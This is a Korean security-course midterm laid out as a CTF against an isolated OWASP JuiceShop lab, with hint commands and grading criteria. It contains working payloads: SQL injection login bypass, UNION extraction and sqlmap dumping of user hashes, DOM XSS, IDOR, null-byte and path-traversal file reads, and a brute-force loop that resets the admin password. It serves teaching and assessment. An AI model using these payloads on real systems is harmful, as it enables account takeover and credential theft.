# Week 08: 중간고사 — CTF 형식 실습 시험

## 학습 목표
- Week 02~07에서 배운 7가지 공격 기법을 **시간 제한**과 **독립 수행** 조건에서 재현한다
- 각 공격의 kill chain(정찰→취약점 식별→공격 실행→증적 확보)을 완주한다
- 풀이 과정을 보고서 형식으로 기록하여 모의해킹 실무를 모사한다
- Bastion 자연어 인터페이스로 공격 일부를 자동화해본다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| manager | 10.20.30.200 | 시험 기지, Bastion API :8003 |
| web | 10.20.30.80 | JuiceShop :3000 (공격 대상) |
| secu | 10.20.30.1 | 방화벽/IPS (참조용) |
| siem | 10.20.30.100 | Wazuh (공격 흔적 확인용) |

## 시험 개요

| 항목 | 내용 |
|------|------|
| 시간 | 120분 (답안 정리 포함 180분) |
| 문항 | 10개 × 10점 = 100점 |
| 도구 | curl, nmap, python3, sqlmap, 브라우저 |
| 금지 | 웹 검색(JuiceShop 공식 해답 페이지), 타인 협력 |
| 제출 | md 형식 보고서, kill chain + 방어 방안 포함 |

---

# Part 1: JuiceShop Score Board 이해

## 1.1 Score Board 접근

JuiceShop은 챌린지 해결 현황을 자체 제공한다.

```bash
# API로 챌린지 목록 확인
curl -s http://10.20.30.80:3000/api/Challenges | python3 -c "
import sys, json
data = json.load(sys.stdin)['data']
print(f'총 챌린지: {len(data)}개')
print('-' * 60)
# 난이도별 개수
from collections import Counter
diff = Counter(c['difficulty'] for c in data)
for d in sorted(diff): print(f'  {d}star: {diff[d]}개')
"
```

**브라우저 접근:** `http://10.20.30.80:3000/#/score-board`

## 1.2 해결 현황 확인

```bash
# 해결된 챌린지(solved=true) 조회
curl -s http://10.20.30.80:3000/api/Challenges | python3 -c "
import sys, json
data = json.load(sys.stdin)['data']
solved = [c for c in data if c.get('solved')]
print(f'해결: {len(solved)} / {len(data)}')
for c in solved:
    print(f'  [v] ({c[\"difficulty\"]}★) {c[\"name\"]}')
" 2>/dev/null
```

**결과 해석:** 학생 본인이 공격 성공 시 `solved: true`로 자동 변경. 시험 중 이 API로 진행 상황 확인 가능.

---

# Part 2: 시험 응시 전 복습 (Week 02~07 핵심 명령)

## Week 02 — 정찰

```bash
nmap -sV -p 22,80,3000 10.20.30.80
curl -sI http://10.20.30.80:3000
curl -s http://10.20.30.80:3000/robots.txt
curl -s http://10.20.30.80:3000/ftp
```

## Week 03 — HTTP/JWT

```bash
# 로그인 후 토큰 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# JWT 페이로드 디코딩
echo "$TOKEN" | cut -d. -f2 | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip()+'=='
print(json.dumps(json.loads(base64.urlsafe_b64decode(d)),indent=2))
"
```

## Week 04 — SQL Injection

```bash
# Admin 로그인 우회
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}'

# 검색 UNION
curl -s "http://10.20.30.80:3000/rest/products/search?q=xyz'))+UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users--"
```

## Week 05 — XSS (브라우저에서)

- `http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert('xss')">`
- `http://10.20.30.80:3000/#/track-result?id=<iframe src="javascript:alert('xss')">`

## Week 06 — 인증/접근제어

```bash
# 보안 질문
curl -s "http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op"

# IDOR
curl -s http://10.20.30.80:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN"
```

## Week 07 — 파일 접근

```bash
# Null byte 우회
curl -s "http://10.20.30.80:3000/ftp/package.json.bak%2500.md"

# 경로 탐색 인코딩
curl -s "http://10.20.30.80:3000/ftp/%2e%2e/%2e%2e/etc/passwd"
```

---

# Part 3: CTF 문제 (10문제 × 10점 = 100점)

## 문제 1 — Score Board 발견 (1★, 10점)

**주제:** Week 02 정찰

**목표:** JuiceShop의 숨겨진 Score Board 페이지 URL을 찾아라.

**힌트:** 프론트엔드 JavaScript에 라우팅 정보가 있다.

**힌트 명령:**
```bash
curl -s http://10.20.30.80:3000/main.js | grep -oE 'score-?[bB]oard' | head -3
```

**답안 형식:** Score Board URL + 찾는 과정 설명.

---

## 문제 2 — /ftp 디렉토리 전체 파일 목록 (1★, 10점)

**주제:** Week 02 정찰

**목표:** `/ftp` 디렉토리의 모든 파일 이름을 나열하라.

**힌트 명령:**
```bash
curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool
```

**답안 형식:** 파일 이름 전체 목록 + 각 파일의 추정 용도(확장자 기준).

---

## 문제 3 — 관리자 페이지 접근 (1★, 10점)

**주제:** Week 02 + Week 06

**목표:** JuiceShop 관리자 페이지 URL을 찾고, SQLi로 얻은 admin 토큰으로 접근하라.

**힌트 명령:**
```bash
curl -s http://10.20.30.80:3000/main.js | grep -oE '/administration' | head -3

# Week 04 SQLi
ADMIN_TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
```

**답안 형식:** 관리자 URL + admin JWT + 브라우저에서 접근 스크린샷.

---

## 문제 4 — SQLi로 Admin 로그인 (2★, 10점)

**주제:** Week 04

**목표:** SQL Injection으로 `admin@juice-sh.op` 비밀번호 없이 로그인하라.

**답안 형식:** 사용한 페이로드, 결과 JWT의 페이로드 디코딩, `role=admin` 확인.

---

## 문제 5 — DOM XSS 실행 (2★, 10점)

**주제:** Week 05

**목표:** JuiceShop 검색 또는 주문 추적 페이지에서 alert 팝업을 띄워라.

**힌트 페이로드:**
- `/#/search?q=<iframe src="javascript:alert('xss')">`
- `/#/track-result?id=<iframe src="javascript:alert('xss')">`

**답안 형식:** 사용한 URL, alert 스크린샷, `<script>`가 안 되고 `<iframe>`은 되는 이유 설명.

---

## 문제 6 — 0점 리뷰 등록 (2★, 10점)

**주제:** Week 03 + Week 06

**목표:** UI에서는 최소 1점인 피드백을 **API 직접 호출**로 rating=0 저장.

**힌트 명령:**

```bash
TOKEN=... # 로그인 토큰
CAPTCHA_RESP=$(curl -s http://10.20.30.80:3000/api/Captchas/ -H "Authorization: Bearer $TOKEN")
CAPTCHA_ID=$(echo "$CAPTCHA_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['captchaId'])")
CAPTCHA_ANS=$(echo "$CAPTCHA_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['answer'])")

curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"UserId\":22,\"captchaId\":$CAPTCHA_ID,\"captcha\":\"$CAPTCHA_ANS\",\"comment\":\"zero\",\"rating\":0}"
```

**답안 형식:** 생성된 피드백의 id·rating=0 응답.

---

## 문제 7 — IDOR로 admin 장바구니 열람 (3★, 10점)

**주제:** Week 06

**목표:** customer 권한 토큰으로 `/rest/basket/1` (admin 장바구니) 내용을 가져와라.

**힌트 명령:**

```bash
curl -s http://10.20.30.80:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**답안 형식:** 응답 JSON 요약 + "왜 customer 토큰으로 admin 데이터가 보이는가" 분석.

---

## 문제 8 — Null byte로 제한 파일 다운로드 (3★, 10점)

**주제:** Week 07

**목표:** `/ftp/package.json.bak` 같은 `.md`/`.pdf` 아닌 파일을 Null byte 우회로 다운로드하라.

**힌트 명령:**

```bash
curl -s "http://10.20.30.80:3000/ftp/package.json.bak%2500.md" | head -30
```

**답안 형식:** 파일 내용 일부 + `%2500`의 동작 원리 설명.

---

## 문제 9 — 보안 질문으로 admin 비밀번호 재설정 (3★, 10점)

**주제:** Week 06

**목표:** admin의 보안 질문을 확인하고, 답변 brute force로 비밀번호를 재설정하라.

**힌트 명령:**

```bash
# 보안 질문 조회
curl -s "http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op" | python3 -m json.tool

# 답변 시도 — OSINT로 찾거나 brute force
for answer in "Samuel" "Sam" "admin" "test" "Zaya" "John"; do
  RESP=$(curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$answer\",\"new\":\"Hacked123!\",\"repeat\":\"Hacked123!\"}")
  echo "  '$answer' -> $(echo "$RESP" | head -c 80)"
done
```

**답안 형식:** 성공한 답변 + 재설정 후 새 비밀번호로 로그인 성공 JWT.

---

## 문제 10 — 전체 Users 이메일·해시 추출 (4★ 보너스, 10점)

**주제:** Week 04 UNION SQLi 심화

**목표:** `rest/products/search`의 UNION SQLi로 모든 사용자 이메일과 비밀번호 해시를 추출하라 (sqlmap 또는 수동).

**힌트 (sqlmap):**

```bash
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
  --batch -T Users -C email,password --dump 2>&1 | tail -30
```

**답안 형식:** 최소 5명 이상의 email + hash 목록.

---

# Part 4: 채점 기준

| 등급 | 점수 | 기준 |
|------|------|------|
| A+ | 90~100 | 9~10문제 + 풀이 명확 |
| A | 80~89 | 8문제 |
| B+ | 70~79 | 7문제 |
| B | 60~69 | 6문제 |
| C+ | 50~59 | 5문제 |
| C | 40~49 | 4문제 |
| D | 30~39 | 3문제 |
| F | 0~29 | 2문제 이하 |

**감점**
- 풀이 과정 없이 결과만: -3점/문제
- 타 학생 풀이 복사: 해당 문제 0점
- 시간 초과: -2점/10분

**가산점**
- 창의적 풀이: +3점/문제
- 방어 방법 기술: +2점/문제
- Bastion 자동화: +3점 (1회 한정)

---

# Part 5: 답안 제출 양식

각 문제마다 다음 형식:

```
## 문제 N — [문제 제목]

### 사용 기법
[Week 0X] XXX 기법

### Kill chain
1. 정찰: ...
2. 취약점 식별: ...
3. 공격 실행: ...
4. 증적 확보: ...

### 실행 명령
```bash
...
```

### 결과
(획득한 플래그·데이터·스크린샷)

### 방어 방법 (가산점)
- ...
```

---

# Part 6: Bastion 자동화 (가산점 +3)

```bash
curl -s -X POST http://10.20.30.200:8003/ask \
  -H 'Content-Type: application/json' \
  -d '{
    "message": "JuiceShop CTF 중간고사 준비를 위해 다음을 모두 수행해줘: (1) robots.txt 내용, (2) /ftp 파일 목록, (3) admin@juice-sh.op 보안질문, (4) /rest/products/search?q=apple 정상 응답 구조, (5) 포트 22/80/3000 서비스 버전. 결과를 표로 정리."
  }' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
```

Evidence 확인:

```bash
curl -s "http://10.20.30.200:8003/evidence?limit=10" | python3 -c "
import sys, json
for e in json.load(sys.stdin)[:10]:
    msg = e.get('user_message','')[:70]
    ok = '✓' if e.get('success') else '✗'
    print(f'  {ok} {msg}')
"
```

---

# Part 7: 시험 후 복습

## 해결 못 한 문제

- 어떤 기법이 필요했는가?
- 어디서 막혔는가?
- 힌트를 보고 재풀이

## Week별 개념 매트릭스

| 주차 | 핵심 기법 | 방어 |
|------|-----------|------|
| 02 | nmap·핑거프린팅 | 배너 숨김, 불필요 포트 닫기 |
| 03 | HTTP 분석, JWT 디코딩 | 보안 헤더, HttpOnly |
| 04 | SQLi | 매개변수화, ORM |
| 05 | XSS (DOM/Reflected/Stored) | 출력 인코딩, CSP |
| 06 | 인증 우회, IDOR | RBAC, 서버 측 권한 검증 |
| 07 | SSRF, 업로드, 경로 탐색 | 입력 검증, 화이트리스트 |

---

## 다음 주 예고

**Week 09: 방어로의 전환 — 패킷 분석과 탐지의 시작**
- tcpdump로 패킷 캡처
- Wireshark 필터 분석
- 공격 로그를 SIEM에서 찾기
- Suricata 룰 읽기

Week 09부터 Blue Team 시각으로 전환한다.

---

## 📂 실습 참조 파일 가이드

> 이번 주 시험에서 **직접 쓰는** 도구만.

### 시험장 도구 (manager VM)

| 도구 | 용도 | 이번 시험 문제 |
|------|------|-----------------|
| `curl` | HTTP 요청 | 1~4, 6~10 |
| `python3` | JWT 디코딩, JSON 파싱 | 3, 4, 7 |
| `nmap` | 포트 스캔 | (복습) |
| `sqlmap` | SQLi 자동화 | 10 (보너스) |
| 학생 브라우저 | DOM XSS 실행, 관리자 페이지 시각 확인 | 3, 5 |
| Bastion `/ask` | 자연어 자동화 | 가산점 |

### JuiceShop 이번 시험 사용 엔드포인트

| 엔드포인트 | 문제 |
|-----------|------|
| `/main.js` | 1, 3 |
| `/robots.txt` | 1 |
| `/ftp` + `/ftp/:file` | 2, 8 |
| `/#/administration` | 3 |
| `/rest/user/login` | 4 |
| `/#/search?q=`, `/#/track-result?id=` | 5 |
| `/api/Captchas/` + `/api/Feedbacks/` | 6 |
| `/rest/basket/:id` | 7 |
| `/rest/user/security-question?email=` | 9 |
| `/rest/user/reset-password` | 9 |
| `/rest/products/search?q=` | 10 |

### Bastion API (이번 주)

| 메서드 | 경로 | 용도 |
|--------|------|------|
| POST | `/ask` | 자연어 정찰 자동화 (가산점) |
| GET | `/evidence?limit=N` | 시험 중 작업 기록 |

---

> **실습 환경 검증 완료** (2026-03-28): JuiceShop SQLi/XSS/IDOR, nmap, 경로탐색(%2500), sudo NOPASSWD, SSH키, crontab

---

## 실제 사례 (WitFoo Precinct 6)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> Sanitized — RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 익명화됨.

### Case 1: `T1041` 패턴

```
src=100.64.4.210 dst=172.22.195.168 tech=T1041 mo_name=Data Theft
tactic=TA0010 (Exfiltration) suspicion=0.84
lifecycle=complete-mission
```

**해석**: 위 데이터는 실제 incident 의 sanitized 기록이다. `T1041` MITRE technique 의 행동 패턴이며, 본 강의의 학습 주제와 동일한 운영 맥락에서 발생한다.

### Case 2: `T1041` 패턴

```
src=172.22.36.156 dst=100.64.9.98 tech=T1041 mo_name=Data Theft
tactic=TA0010 (Exfiltration) suspicion=0.92
lifecycle=complete-mission
```

**해석**: 위 데이터는 실제 incident 의 sanitized 기록이다. `T1041` MITRE technique 의 행동 패턴이며, 본 강의의 학습 주제와 동일한 운영 맥락에서 발생한다.

